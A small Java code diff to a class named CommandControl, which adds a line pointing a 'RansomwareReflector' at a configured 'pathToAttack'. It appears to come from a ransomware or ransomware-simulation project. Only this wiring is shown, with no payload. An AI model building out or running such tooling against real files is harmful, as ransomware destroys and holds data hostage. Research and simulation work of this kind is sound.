@@ -1,6 +1,7 @@
 package leverCom;
 
 import com.google.common.eventbus.Subscribe;
+import configuration.Configuration;
 import configuration.ConsoleCorrespondation;
 import console.Console;
 import console.Subscriber;
@@ -14,6 +15,7 @@ public class CommandControl extends Subscriber implements IConsoleUser {
     public CommandControl(Integer id, Console console){
         super(id);
         this.reflector = new RansomwareReflector();
+        this.reflector.setPath(Configuration.instance.pathToAttack);
         this.console = console;
     }
 
